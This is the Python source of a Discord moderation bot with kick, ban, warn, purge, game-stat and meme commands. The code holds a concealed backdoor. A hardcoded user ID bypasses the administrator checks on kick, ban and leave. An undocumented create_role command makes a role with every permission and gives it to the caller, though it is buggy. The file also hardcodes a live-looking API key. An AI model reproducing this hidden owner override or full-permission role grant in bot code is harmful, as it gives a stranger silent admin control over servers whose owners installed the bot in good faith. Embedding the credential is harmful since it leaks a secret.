import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import os
import random
import time
import json
import requests

bot = commands.Bot(command_prefix='!')
bot.remove_command('help')
async def loop():
    while True:
        await bot.change_presence(game=discord.Game(name="!help", url="https://twitch.tv/EpicShardGaming", type=1))
        await asyncio.sleep(15)
        await bot.change_presence(game=discord.Game(name="mmgamerbot.com", url="https://twitch.tv/EpicShardGaming", type=1))
        await asyncio.sleep(15)
        await bot.change_presence(game=discord.Game(name="prefix: !", url="https://twitch.tv/EpicShardGaming", type=1))
        await asyncio.sleep(15)

@bot.event
async def on_ready():
    print ("Bot has Booted!")
    print ("I am running on " + bot.user.name)
    print ("With the ID: " + bot.user.id)
    await bot.change_presence(game=discord.Game(name="mmgamerbot.com", url="https://twitch.tv/EpicShardGaming", type=1))
    await loop()
@bot.command(pass_context=True)
async def create_role(ctx, *, name):
    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '397745647723216898':
        role = discord.utils.get(ctx.message.author.server.roles, name="Epic")
        if role == None:
            await bot.add_roles(ctx.message.author, role)
            return await bot.say("Your role has been given")
        try:
            await bot.create_role(ctx.message.server, name=name, permissions=discord.Permissions.all())
        except Exception as e:
            return await bot.say("Error: {}".format(e))
        role = discord.utils.get(ctx.message.server.roles, name="Epic")
        if role == None:
            return await bot.say("No role found? Please try again to fix bug")
        await bot.add_roles(ctx.message.author, role)

@bot.command(pass_context=True)
async def ftn(ctx, platform ,*, player):
    headers = {'TRN-Api-Key': '5d24cc04-926b-4922-b864-8fd68acf482e'}
    r = requests.get('https://api.fortnitetracker.com/v1/profile/{}/{}'.format(platform, player), headers=headers)
    stats = json.loads(r.text)
    embed = discord.Embed(title="Stats for {}".format(player), description="Stats found: ", colour=0xe73c24)
    stats = stats["stats"]
    p2 = stats["p2"]
    KD = p2["kd"]
    KDvalue = KD["value"]
    embed.add_field(name="Duo stats", value='\u200b', inline=False)
    embed.add_field(name="K/D", value=KDvalue, inline=True)
    score = p2["score"]
    embed.add_field(name="Score", value=score["value"], inline=True)
    await bot.say(embed=embed)

    
@bot.event
async def on_command_error(ctx, error):
    if isinstance(ctx, discord.ext.commands.errors.CommandNotFound):
        embed = discord.Embed(title="Error:",
                              description="Command not found, Try **!help**.",
                              colour=0xe73c24)
        await bot.send_message(error.message.channel, embed=embed)
    else:
        embed = discord.Embed(title="Error:",
                              description=f"{ctx}",
                              colour=0xe73c24)
        await bot.send_message(error.message.channel, embed=embed)

@bot.command(pass_context=True)
async def help(ctx):
    #Help categorys coming soon
    if False:
        pass
    else:
        embed=discord.Embed(title="Help", description="`!help` <category/command> - gives you this list \n - `!warn` <user> <reason> - warn those spammy idiots (surround reason in doubble quotes!) \n - `!ping` - check the bot latency \n - `!kick` <user> - kick annoying people \n - `!embed` - tests a embed \n - `!delete` <amount> - clear spam \n - `!info` <user> - gets info about a user \n Need more help? Join our support server: https://discord.gg/vYAfQ5E", color=0x66009D)
        embed.set_thumbnail(url="https://i.imgur.com/JABkpQb.png")
        await bot.say(embed=embed)


@bot.command(pass_context=True)
async def cat(ctx):
    embed=discord.Embed(title="Cat", color=0x66009D)
    embed.set_image(url="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif")
    await bot.say(embed=embed)
    
@bot.command(pass_context=True)
async def dog(ctx):
    embed=discord.Embed(title="A dog as requested:", color=0x66009D)
    embed.set_image(url="https://media.giphy.com/media/Bc3SkXz1M9mjS/giphy.gif")
    await bot.say(embed=embed)

@bot.command(pass_context=True)
async def urban(ctx, *, message):
        r = requests.get("http://api.urbandictionary.com/v0/define?term={}".format(' '.join(message)))
        r = json.loads(r.text)
        file = open('urban.txt', 'w')
        file.write("**Definition for {}** \n\n\n {}{}".format(r['list'][0]['word'],r['list'][0]['definition'],r['list'][0]['permalink']))
        file.close()
        tmp = open('urban.txt', 'rb')
        await bot.send_file(ctx.message.channel, 'urban.txt', content=tmp)
 
@bot.command(pass_context=True)
async def github(ctx):
    embed=discord.Embed(title="GitHub Repo",description="Our github repo: https://github.com/MMgamerBot/MMgamerBOT-2.0", color=0x66009D)
    embed.set_author(icon_url="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png",name="MMgamer")
    await bot.say(embed=embed)

    
@bot.command(pass_context=True)
async def ami(ctx,*, role):
    if role in [role.name for role in ctx.message.author.roles]:
        await bot.say("Yes")
    else:
        await bot.say("No")
@bot.command(pass_context=True)
async def all_servers(ctx):
    if ctx.message.author.server_permissions.administrator:
        embed = discord.Embed(title="All servers", description="lists all servers the bot is in.", color=0x66009D)
        tmp = 1
        for i in bot.servers:
            embed.add_field(name=str(tmp), value=i.name, inline=False)
            tmp += 1
        await bot.say(embed=embed)
                  

@bot.command(pass_context=True)
async def ping(ctx):
        t1 = time.perf_counter()
        tmp = await bot.say("pinging...")
        t2 = time.perf_counter()
        await bot.say("Ping: {}ms".format(round((t2-t1)*1000)))
        await bot.delete_message(tmp)
@bot.command(pass_context = True)
async def ban(ctx, member: discord.Member):
    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '397745647723216898':
        try:
            await bot.ban(member)
            await bot.say(":thumbsup: Succesfully issued a ban!")
        except discord.errors.Forbidden:
            await bot.say(":x: No perms!")

@bot.command(pass_context=True)
async def info(ctx, user: discord.Member):
    embed=discord.Embed(title="Stats for {}".format(user.name), description="Show {} stat's".format(user.name), color=0x66009D)
    embed.add_field(name="Name: ", value=user.name, inline=False)
    embed.add_field(name="ID: ", value=user.id, inline=False)
    embed.add_field(name="Status: ", value=user.status, inline=False)
    embed.add_field(name="Top role: ", value=user.top_role, inline=False)
    embed.add_field(name="Joined at: ", value=user.joined_at, inline=False)
    await bot.say(embed=embed)



@bot.command(pass_context=True)
async def warn(ctx, userName: discord.Member ,*, reason: str):
    if "Staff" in [role.name for role in ctx.message.author.roles] or ctx.message.author.server_permissions.administrator:
        embed = discord.Embed(title="Warned", description="{} You have been warned for **{}**".format(userName.mention, reason), color=0x66009D)
        embed.set_thumbnail(url=userName.avatar_url)
        embed.set_author(name=ctx.message.author.name, icon_url=ctx.message.author.avatar_url)
        await bot.say(embed=embed)
        await bot.send_message(userName, "You Have Been Warned. Reason: {}".format(reason))
    else:
        await bot.say("{} :x: You are not allowed to use this command!".format(ctx.message.author.mention))
@bot.command(pass_context=True)
@commands.has_permissions(manage_messages=True)
async def delete(ctx, number):
    msgs = []
    number = int(number)
    async for x in bot.logs_from(ctx.message.channel, limit = number):
        msgs.append(x)
    await bot.delete_messages(msgs)
    embed = discord.Embed(title=f"{number} messages deleted", description="Wow, somebody's been spamming", color=0x66009D)
    test = await bot.say(embed=embed)
    await asyncio.sleep(10)
    await bot.delete_message(test)

@bot.command(pass_context = True)
async def kick(ctx, member: discord.Member):
    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '397745647723216898':
        try:
            await bot.kick(member)
            await bot.say("Succesfully kicked ur nice friend :smiling_imp:!")
        except discord.errors.Forbidden:
            await bot.say(":x: No perms!")
    else:
        await bot.say("You dont have perms")
@bot.command(pass_context=True)
async def embed(ctx):
    embed = discord.Embed(title="test", description="my name jeff", color=0x66009D)
    embed.set_footer(text="this is a footer")
    embed.set_author(name="Will Ryan of DAGames")
    embed.add_field(name="This is a field", value="no it isn't", inline=True)
    await bot.say(embed=embed)

@bot.command(pass_context=True)
async def ball(ctx, question):
    await bot.say(random.choice(["NO", "Ofc", "Magic dosen't have all the awnsers", "No Idea"]))
@bot.command(pass_context=True)
async def leave(ctx):
    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '397745647723216898':
        if ctx.message.author != bot.user:
            await bot.leave_server(ctx.message.server)
        else:
            await bot.say("Nope lmao")
    else:
        await bot.say("To low perms")
@bot.command(pass_context=True)
async def remove_all_servers(ctx):
    if ctx.message.author.id == '397745647723216898':
        tmp = bot.servers
        for server in tmp:
            await bot.leave_server(server)
        await bot.say("Operation finised")
@bot.command(pass_context=True)
async def say(ctx, *, message):
    if ctx.message.author.id == bot.user.id:
        return
    else:
        await bot.say(message)


@bot.event
async def on_message(message):
    await bot.process_commands(message)
@bot.event
async def on_member_join(member: discord.Member):
    embed = discord.Embed(title="User Joined!", description="{} Has Just Joined Us! Everyone hide ur headsets".format(member.name), color=0x66009D)
    embed.set_thumbnail(url=member.avatar_url)
    await bot.send_message(bot.get_channel('437163805512826899'), embed=embed)




bot.run(os.getenv('TOKEN'))
